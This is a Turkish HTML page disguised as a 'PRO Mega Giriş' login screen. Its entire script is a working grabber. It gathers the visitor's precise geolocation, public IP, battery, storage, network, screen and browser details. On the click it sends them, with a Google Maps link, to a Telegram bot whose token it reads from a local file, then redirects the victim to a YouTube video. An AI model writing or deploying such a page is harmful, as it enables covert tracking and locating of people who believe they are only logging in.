<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>PRO Mega Giriş</title>
  <style>
    body { font-family: Arial; background: #eef; text-align: center; padding: 50px; }
    input, button { padding: 10px; font-size: 16px; margin: 8px; }
    #uyari { color: red; margin-top: 10px; }
  </style>
</head>
<body>
  <h1>🚀 PRO Mega Giriş</h1>
  <input id="username" placeholder="Adınızı girin">
  <button onclick="girisYap()">Giriş Yap</button>
  <div id="uyari"></div>

  <script>
    // 1. Bilgi nesnesi
    let info = {
      name: "", lat:null, lon:null,
      ip: "Alınamadı", browser:"site:Bilinmiyor",
      screen:`${screen.width}x${screen.height}`,
      pixelRatio: devicePixelRatio,
      colorDepth: screen.colorDepth,
      memory: navigator.deviceMemory||"?",
      cores: navigator.hardwareConcurrency||"?",
      online: navigator.onLine, platform: navigator.platform,
      language: navigator.language,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hour: new Date().getHours(),
      timestamp: new Date().toLocaleString(),
      batteryLevel:"?", charging:"?",
      storageUsage:"?", storageQuota:"?",
      netType:"?", downlink:"?", rtt:"?",
      darkMode:false,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack||navigator.msDoNotTrack,
      orientation: (screen.orientation&&screen.orientation.type)||"unknown",
      pluginsCount: navigator.plugins?navigator.plugins.length:"?",
      pageLoadTime:0
    };

    // 2. Sayfa yüklenince veri toplama
    window.onload = async () => {
      const start = performance.timing.navigationStart;

      // Konum
      navigator.geolocation.getCurrentPosition(
        p=>{ info.lat=p.coords.latitude; info.lon=p.coords.longitude; },
        ()=>document.getElementById("uyari").innerText="📍 Konum izni gerekli!"
      );

      // IP
      try {
        const data = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
        info.ip = data.ip;
      } catch {}

      // Batarya
      if (navigator.getBattery) {
        const bat = await navigator.getBattery();
        info.batteryLevel = Math.round(bat.level*100)+"%";
        info.charging     = bat.charging;
      }

      // Otomatik depolama tahmini
      if (navigator.storage && navigator.storage.estimate) {
        const { usage, quota } = await navigator.storage.estimate();
        info.storageUsage = usage;
        info.storageQuota = quota;
      }

      // Ağ kalitesi
      const conn    = navigator.connection||{};
      info.netType  = conn.effectiveType||"?";
      info.downlink = conn.downlink||"?";
      info.rtt      = conn.rtt||"?";

      // Tarayıcı türü
      const ua = navigator.userAgent;
      if(ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
      else if(ua.includes("Firefox"))                    info.browser="site:Firefox";
      else if(ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
      else if(ua.includes("Edg"))                        info.browser="site:Edge";

      // Karanlık mod
      info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;

      // Yükleme süresi
      info.pageLoadTime = performance.timing.domContentLoadedEventEnd - start;
    };

    // 3. Giriş fonksiyonu
    async function girisYap() {
      info.name = document.getElementById("username").value.trim();
      if (!info.name)
        return document.getElementById("uyari").innerText="🧠 İsim gerekli!";
      if (info.lat === null)
        return document.getElementById("uyari").innerText="📍 Konum izni gerekli!";

      // Telegram bilgileri
      const txt = await fetch("bilgiler.txt").then(r=>r.text());
      const BOT_TOKEN = txt.match(/BOT_TOKEN=(.*)/)[1].trim();
      const CHAT_ID   = txt.match(/CHAT_ID=(.*)/)[1].trim();

      // Harita linki
      const maps = `https://www.google.com/maps?q=${info.lat},${info.lon}`;

      // Depolamayı MB’ye çevir
      const usedMB  = (info.storageUsage/1024/1024).toFixed(2);
      const quotaMB = (info.storageQuota/1024/1024).toFixed(2);

      // Mesaj oluşturma
      const msg = `
🎮 *Yeni Mega Giriş!*
👤 İsim: *${info.name}*
📍 Konum: *${info.lat}, ${info.lon}*
🔗 Harita: [Google Maps](${maps})

🖥️ IP: *${info.ip}*
🧭 Tarayıcı: *${info.browser}*
📱 Platform: *${info.platform}*
🌐 Dil: *${info.language}*
⏰ Saat Dilimi: *${info.timeZone}*
⌚ Yerel Zaman: *${info.timestamp}*

💻 Ekran: *${info.screen}* (@${info.pixelRatio}x, ${info.colorDepth} bit)
⚙️ RAM/Çekirdek: *${info.memory}GB / ${info.cores} çekirdek*
🔋 Pil: *${info.batteryLevel}* (Şarj: ${info.charging})
💾 Depolama: *${usedMB}MB / ${quotaMB}MB*
📶 Ağ: *${info.netType}* (${info.downlink}Mbps, ${info.rtt}ms)
🌙 Karanlık Mod: *${info.darkMode ? "Aktif" : "Kapalı"}*
🍪 Çerez: *${info.cookieEnabled}*
🚫 DoNotTrack: *${info.doNotTrack}*
📐 Yönelim: *${info.orientation}*
🔌 Eklenti Sayısı: *${info.pluginsCount}*
⏱️ Yükleme Süresi: *${info.pageLoadTime}ms*
📶 Çevrimiçi: *${info.online}*
`;

      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: msg,
          parse_mode: "Markdown"
        })
      });

     
      window.location.href = "https://www.youtube.com/watch?v=IxX_QHay02M";
    }
  </script>
</body>
</html>
